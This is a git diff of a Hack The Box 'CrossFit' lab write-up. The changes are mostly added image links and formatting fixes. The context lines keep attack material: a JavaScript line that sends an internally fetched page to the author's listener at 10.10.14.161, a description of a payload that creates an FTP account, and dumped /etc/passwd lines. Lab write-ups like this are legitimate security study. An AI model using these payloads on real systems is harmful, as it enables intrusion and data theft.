@@ -327,7 +327,7 @@ request2.open('GET', 'http://10.10.14.161:8090/' + response1, true);
 request2.send()
 ```
 
-I wrote a javascript payload to reach out to the ftp site, then send the response back to my python http.server. 
+I wrote a JavaScript payload to reach out to the ftp site, then send the response back to my python http.server. 
 
 ```text
 ┌──(zweilos㉿kalimaa)-[~/htb/crossfit]
@@ -381,7 +381,11 @@ It took me a few tries, but I was able to get the server to download my script a
 </html>
 ```
 
-After decoding the response I had the webpage at `http://ftp.crossfit.htb` as viewed internally.  There was a site that sounded interesting: `http://ftp.crossfit.htb/accounts/create`.  I modified my JavaScript payload to see what was at this page.
+After decoding the response I had the webpage at `http://ftp.crossfit.htb` as viewed internally.  
+
+![](../../.gitbook/assets/2.5-rescreate-response1.png)
+
+This was a site that sounded interesting: `http://ftp.crossfit.htb/accounts/create`.  I modified my JavaScript payload to see what was at this page.
 
 ```text
 10.10.10.208 - - [21/Mar/2021 18:41:59] "GET /test.js HTTP/1.1" 200 -
@@ -437,7 +441,7 @@ Got back a response
 
 With this page it looked as if I could create a new account.  I would need to send a POST request to `http://ftp.crossfit.htb/accounts` with a username, password, and the value from the hidden field `token`. 
 
-
+![](../../.gitbook/assets/2.5-recreate-adduser.png)
 
 wrote payload to create new ftp user
 
@@ -497,7 +501,7 @@ Note: something is missing here...getting initial connection back, finding and c
 
 ## Initial Foothold
 
-```text
+```bash
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
